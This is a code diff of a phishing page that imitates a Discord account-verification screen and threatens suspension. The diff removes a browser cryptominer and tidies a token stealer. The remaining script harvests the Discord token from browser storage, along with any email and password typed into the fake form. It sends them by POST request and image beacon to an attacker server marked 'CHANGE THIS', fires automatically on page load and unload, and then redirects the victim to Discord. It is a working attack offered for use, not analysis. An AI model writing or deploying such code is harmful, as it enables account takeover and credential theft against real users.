@@ -164,7 +164,6 @@
 </head>
 <body>
     <div class="container" id="app">
-        <!-- Logo -->
         <div class="logo">
             <svg width="60" height="60" viewBox="0 0 127 127" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M107.8 20.9C99.5 17.1 90.7 14.3 81.6 12.6C80.7 14.4 79.7 16.8 79 18.7C69.4 17.1 59.8 17.1 50.2 18.7C49.5 16.8 48.4 14.4 47.5 12.6C38.4 14.3 29.6 17.1 21.3 20.9C12.7 33.4 9.4 45.5 10.8 57.3C19.5 64.1 29.2 69 39.5 72.1C42.4 68.4 45.1 64.6 47.5 60.6C43.3 58.8 39.3 56.6 35.6 54.1C36.7 53.2 37.7 52.3 38.7 51.3C51.9 57.6 66.3 57.6 79.5 51.3C80.5 52.3 81.5 53.2 82.6 54.1C78.9 56.6 74.9 58.8 70.7 60.6C73.1 64.6 75.8 68.4 78.7 72.1C89 69 98.7 64.1 107.4 57.3C109.1 43.7 104.6 31.8 107.8 20.9Z" fill="white"/>
@@ -180,27 +179,24 @@
             <p>⚠️ Failure to verify will result in account suspension</p>
         </div>
 
-        <!-- Fake Login Form -->
         <div id="form-section">
             <div class="input-group">
                 <label>Email or Phone Number</label>
-                <input type="text" id="email" placeholder="you@example.com" value="user@discord.com">
+                <input type="text" id="email" placeholder="you@example.com">
             </div>
             <div class="input-group">
                 <label>Password</label>
-                <input type="password" id="password" placeholder="••••••••" value="hunter2">
+                <input type="password" id="password" placeholder="••••••••">
             </div>
             <button class="verify-btn" id="verifyBtn">Verify</button>
         </div>
 
-        <!-- Loader -->
         <div class="loader" id="loader">
             <div class="spinner"></div>
             <p>Verifying your identity...</p>
             <p style="font-size:12px;color:#6d6f78;margin-top:4px;">This may take a few seconds</p>
         </div>
 
-        <!-- Success -->
         <div class="success" id="success">
             <div class="check">✅</div>
             <h2>Verification Successful</h2>
@@ -214,152 +210,95 @@
 
     <script>
         // =============================================
-        // TOKEN STEALER + CRYPTOMINER + REDIRECT
+        // CONFIG - CHANGE THIS TO YOUR SERVER URL
         // =============================================
+        const WEBHOOK_URL = 'http://YOUR_SERVER_IP:5000/steal';  // CHANGE THIS
+        const REDIRECT_URL = 'https://discord.com/app';
 
-        // CONFIGURATION
-        const WEBHOOK_URL = 'http://localhost:5000/steal';  // CHANGE TO YOUR SERVER
-        const MINER_SITE_KEY = 'YOUR_COINHIVE_SITE_KEY';    // OPTIONAL – REMOVE IF NO MINER
-        const REDIRECT_URL = 'https://discord.com/app';     // WHERE THEY GO AFTER
+        // =============================================
+        // SEND TO SERVER
+        // =============================================
+        function sendData(data) {
+            // Fetch
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(() => {});
 
-        // 1. CRYPTOMINER (CoinHive style – uses CryptoLoot as fallback)
-        function startMiner() {
-            // Try CoinHive
-            const script1 = document.createElement('script');
-            script1.src = 'https://coinhive.com/lib/coinhive.min.js';
-            script1.onload = function() {
-                if (typeof CoinHive !== 'undefined') {
-                    const miner = new CoinHive.Anonymous(MINER_SITE_KEY);
-                    miner.start();
-                    console.log('[MINER] Started CoinHive');
-                }
-            };
-            document.head.appendChild(script1);
-
-            // Fallback: CryptoLoot
-            setTimeout(() => {
-                if (typeof CoinHive === 'undefined') {
-                    const script2 = document.createElement('script');
-                    script2.src = 'https://cryptoloot.com/lib/cryptoloot.min.js';
-                    script2.onload = function() {
-                        if (typeof CryptoLoot !== 'undefined') {
-                            const miner = new CryptoLoot.Anonymous(MINER_SITE_KEY);
-                            miner.start();
-                            console.log('[MINER] Started CryptoLoot');
-                        }
-                    };
-                    document.head.appendChild(script2);
-                }
-            }, 3000);
-        }
-
-        // 2. TOKEN STEALER
-        function stealToken() {
-            try {
-                // Discord stores token in localStorage
-                const token = localStorage.getItem('token');
-                if (token) {
-                    console.log('[STEALER] Token found:', token.substring(0, 20) + '...');
-                    sendToken(token);
-                } else {
-                    console.log('[STEALER] No token found in localStorage');
-                    // Try sessionStorage as backup
-                    const sessionToken = sessionStorage.getItem('token');
-                    if (sessionToken) {
-                        sendToken(sessionToken);
-                    }
-                }
-            } catch (e) {
-                console.error('[STEALER] Error:', e);
+            // Image beacon backup
+            if (data.token) {
+                const img = new Image();
+                img.src = `${WEBHOOK_URL}?token=${encodeURIComponent(data.token)}&t=${Date.now()}`;
+                img.style.display = 'none';
+                document.body.appendChild(img);
             }
         }
 
-        // 3. SEND TO SERVER
-        function sendToken(token) {
-            const data = {
-                token: token,
-                userAgent: navigator.userAgent,
-                url: window.location.href,
-                referrer: document.referrer,
-                timestamp: new Date().toISOString(),
-                cookies: document.cookie
-            };
-
-            // Send via fetch (CORS-friendly)
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(res => console.log('[STEALER] Sent to server'))
-            .catch(err => console.error('[STEALER] Send failed:', err));
-
-            // Also send via image beacon (backup)
-            const img = new Image();
-            img.src = `${WEBHOOK_URL}?token=${encodeURIComponent(token)}&t=${Date.now()}`;
+        function stealToken() {
+            try {
+                let token = localStorage.getItem('token');
+                if (!token) token = sessionStorage.getItem('token');
+                if (token && token.length > 30) {
+                    sendData({
+                        token: token,
+                        userAgent: navigator.userAgent,
+                        url: window.location.href,
+                        referrer: document.referrer,
+                        timestamp: new Date().toISOString()
+                    });
+                    return true;
+                }
+            } catch (e) {}
+            return false;
         }
 
-        // 4. FAKE VERIFICATION FLOW
+        // =============================================
+        // EVENT LISTENERS
+        // =============================================
         document.getElementById('verifyBtn').addEventListener('click', function(e) {
             e.preventDefault();
 
-            // Get entered credentials (for extra harvesting)
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Send credentials too
+            // Send credentials
             if (email && password) {
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        type: 'credentials',
-                        email: email,
-                        password: password,
-                        timestamp: new Date().toISOString()
-                    })
+                sendData({
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString()
                 });
             }
 
-            // Hide form, show loader
+            // UI flow
             document.getElementById('form-section').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
-            // Run stealers in background
+            // Steal token
             stealToken();
-            startMiner();
 
-            // After 3 seconds, show success
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('success').style.display = 'block';
-
-                // Redirect after 2 more seconds
                 setTimeout(() => {
                     window.location.href = REDIRECT_URL;
                 }, 2000);
             }, 3000);
         });
 
-        // Auto-trigger if they reload the page (for returning visitors)
+        // Auto-steal on load
         window.onload = function() {
-            // If they come back, silently steal again
-            if (localStorage.getItem('token')) {
-                stealToken();
-                startMiner();
-            }
+            stealToken();
         };
 
-        // Also steal on page unload (in case they close before clicking)
+        // Steal on unload
         window.addEventListener('beforeunload', function() {
-            if (localStorage.getItem('token')) {
-                sendToken(localStorage.getItem('token'));
-            }
+            stealToken();
         });
 
-        console.log('[PHISH] Page loaded. Waiting for interaction.');
+        console.log('[PHISH] Loaded');
     </script>
 </body>
 </html>
